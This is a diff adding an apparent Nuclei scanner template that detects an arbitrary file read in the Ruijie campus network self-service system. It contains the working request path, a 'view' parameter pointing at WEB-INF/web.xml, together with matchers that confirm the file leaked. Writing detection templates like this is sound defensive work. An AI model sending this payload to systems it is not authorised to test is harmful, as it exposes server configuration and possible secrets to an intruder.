@@ -1,0 +1,25 @@
+id: ruijie-campus-network-login-judge-anyfile-read
+info:
+  name: Ruijie Campus Network Self-Service System Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/selfservice/selfservice/module/scgroup/web/login_judgedge.jsf?view=./WEB-INF/web.xml%3F"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "WEB-INF\\config\\property\\system.properties"
+          - "<param-name>"
+      - type: word
+        part: body
+        words:
+          - "access Forbidden!"
+        negative: true
